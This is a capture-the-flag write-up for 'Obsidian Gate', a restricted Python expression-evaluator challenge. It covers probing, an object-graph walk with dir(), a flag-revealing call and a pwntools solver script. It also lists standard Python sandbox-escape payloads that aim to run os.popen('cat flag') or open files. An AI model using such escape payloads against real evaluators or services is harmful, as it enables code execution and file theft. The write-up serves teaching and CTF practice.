# Obsidian Gate Write-up

## Challenge Information

- **Challenge Name:** Obsidian Gate
- **Category:** Pwn / Jail / Python Expression Evaluator
- **Event:** BDSEC CTF 2026
- **Description:** Beyond the obsidian gate lies a sealed archive.
- **Flag Format:** `BDSEC{s0mething_h3re}`
- **Primary Server:** `66.228.50.16:48271`
- **Alternative Server:** `50.116.28.133:48271`

---

## 1. Initial Connection

I connected to the challenge using Netcat:

```bash
nc 66.228.50.16 48271
```

The server displayed:

```text
One expression. One answer.
>
```

This indicated that the service accepted only one expression and returned one result.

---

## 2. Initial Testing

I first tried normal commands and variable names:

```text
> help
GateError: unknown name
```

```text
> ls
GateError: unknown name
```

```text
> hi
GateError: unknown name
```

I also tested arithmetic:

```text
> 1+1
GateError: operation denied
```

These results showed that this was not a normal shell. It was a restricted expression evaluator.

---

## 3. Understanding the Restrictions

I created a small Python probing script and tested common Python syntax.

### Allowed expressions

```text
1
```

Output:

```text
1
```

```text
'A'
```

Output:

```text
'A'
```

```text
'abc'[0]
```

Output:

```text
'a'
```

```text
len('abc')
```

Output:

```text
3
```

```text
repr('abc')
```

Output:

```text
"'abc'"
```

```text
type(1)
```

Output:

```text
'int'
```

### Blocked expressions

Tuple creation was blocked:

```text
()
```

Output:

```text
GateError: operation denied
```

Attribute access on normal Python objects was blocked:

```text
().__class__
```

Output:

```text
GateError: attribute denied
```

Arithmetic was blocked:

```text
1+1
```

Output:

```text
GateError: operation denied
```

Lists, dictionaries, comparisons, slices, lambdas, and boolean operations were also blocked.

Examples:

```text
[1]
{'a':1}
'a'=='a'
'abc'[0:2]
lambda:1
```

All returned:

```text
GateError: operation denied
```

Dangerous Python built-ins were unavailable:

```text
open
__import__
getattr
globals()
locals()
```

They returned either:

```text
GateError: unknown name
```

or:

```text
GateError: unknown call
```

This confirmed that normal Python jail escape techniques would not work.

---

## 4. Failed Python Sandbox Escape Attempts

I initially tried common Python object traversal payloads such as:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='BuiltinImporter'][0]().load_module('os').popen('cat flag').read()
```

This failed because attribute access using `.` on Python objects was denied.

I also tried a dotless `getattr()` based payload:

```python
getattr(getattr(__import__('os'),'popen')('cat flag'),'read')()
```

This also failed because `getattr` and `__import__` were not available.

File-reading attempts failed as well:

```python
open('flag')
list(open('flag'))
[*open('flag')]
```

The evaluator blocked the calls or the required container operations.

At this stage, it became clear that the intended solution was not a Python sandbox escape.

---

## 5. Finding the Exposed Root Object

The important discovery was the hidden global object:

```text
root
```

Testing it returned:

```text
<obsidian root>
```

The evaluator allowed the whitelisted function `dir()` on its own internal objects:

```text
dir(root)
```

Output:

```text
['ash', 'mirror', 'observer', 'year']
```

This revealed that the challenge contained an internal object graph.

The correct strategy was to explore this object graph using `dir()` and follow meaningful fields.

---

## 6. Traversing the Object Graph

### Step 1: Explore `root`

```text
dir(root)
```

Output:

```text
['ash', 'mirror', 'observer', 'year']
```

The most interesting field was `observer`.

```text
root.observer
```

Output:

```text
<observer>
```

### Step 2: Explore `observer`

```text
dir(root.observer)
```

Output:

```text
['left', 'right', 'state']
```

I followed the `right` branch:

```text
root.observer.right
```

Output:

```text
<right>
```

### Step 3: Explore `right`

```text
dir(root.observer.right)
```

Output:

```text
['mark', 'memory']
```

The challenge description mentioned a sealed archive, so `memory` was the logical path.

```text
root.observer.right.memory
```

Output:

```text
<archive>
```

### Step 4: Explore the archive

```text
dir(root.observer.right.memory)
```

Output:

```text
['catalog', 'dust']
```

I followed `catalog`:

```text
root.observer.right.memory.catalog
```

Output:

```text
<catalog>
```

### Step 5: Explore the catalog

```text
dir(root.observer.right.memory.catalog)
```

Output:

```text
['index', 'version']
```

I followed `index`:

```text
root.observer.right.memory.catalog.index
```

Output:

```text
<index>
```

### Step 6: Find the sealed object

```text
dir(root.observer.right.memory.catalog.index)
```

Output:

```text
['empty', 'sealed']
```

I selected `sealed`:

```text
root.observer.right.memory.catalog.index.sealed
```

Output:

```text
<sealed>
```

### Step 7: Find the final capability

```text
dir(root.observer.right.memory.catalog.index.sealed)
```

Output:

```text
['status', 'unveil']
```

The status field showed:

```text
root.observer.right.memory.catalog.index.sealed.status
```

Output:

```text
'intact'
```

The `unveil` field was a callable capability:

```text
root.observer.right.memory.catalog.index.sealed.unveil
```

Output:

```text
<capability unveil>
```

Calling it with an argument failed:

```text
root.observer.right.memory.catalog.index.sealed.unveil(0)
```

Output:

```text
GateError: arguments denied
```

Therefore, I called it without arguments.

---

## 7. Final Payload

```python
root.observer.right.memory.catalog.index.sealed.unveil()
```

Output:

```text
'BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}'
```

---

## 8. Flag

```text
BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}
```

---

## 9. Python Solver

The following script automatically connects to the challenge, sends the final payload, and extracts the flag.

```python
#!/usr/bin/env python3

from pwn import remote
import re

HOSTS = [
    "66.228.50.16",
    "50.116.28.133",
]

PORT = 48271

PAYLOAD = (
    b"root.observer.right.memory.catalog."
    b"index.sealed.unveil()"
)

FLAG_PATTERN = rb"BDSEC\{[^}\r\n]+\}"

for host in HOSTS:
    try:
        print(f"[+] Connecting to {host}:{PORT}")

        io = remote(host, PORT, timeout=5)
        io.recvuntil(b"> ")
        io.sendline(PAYLOAD)

        output = io.recvall(timeout=5)
        io.close()

        print(output.decode(errors="replace"))

        match = re.search(FLAG_PATTERN, output)

        if match:
            flag = match.group().decode()
            print(f"[+] FLAG: {flag}")
            break

    except Exception as error:
        print(f"[-] Connection to {host} failed: {error}")
```

Save it as:

```bash
solve_obsidian.py
```

Run it using:

```bash
python3 solve_obsidian.py
```

Expected result:

```text
[+] Connecting to 66.228.50.16:48271
[+] Opening connection to 66.228.50.16 on port 48271: Done
'BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}'

[+] FLAG: BDSEC{0bs1d14n_g4t3_un53al3d_g00d_jOB}
```

---

## 10. Root Cause

The evaluator successfully blocked common Python sandbox escape techniques, including:

- Python attribute introspection
- Dangerous built-in functions
- Arithmetic operations
- Containers
- Comparisons
- Imports
- File access
- Code execution

However, it exposed a powerful internal object named `root`.

The evaluator also allowed:

- `dir()` on internal objects
- Access to internal object fields
- Calling exposed capability objects

This allowed the full object graph to be enumerated until the `unveil` capability was reached.

The vulnerable path was:

```text
root
└── observer
    └── right
        └── memory
            └── catalog
                └── index
                    └── sealed
                        └── unveil()
```

The challenge was therefore an object-capability discovery problem, not a traditional Python sandbox escape.

---

## 11. Conclusion

The main lesson from this challenge is to carefully study the evaluator's intended object model.

When common jail escape techniques are blocked, exposed internal objects may still provide a direct path to sensitive functionality.

The solution required:

1. Fingerprinting the evaluator
2. Identifying allowed functions
3. Discovering the hidden `root` object
4. Traversing the internal object graph with `dir()`
5. Calling the exposed zero-argument `unveil()` capability

Final exploit:

```python
root.observer.right.memory.catalog.index.sealed.unveil()
```
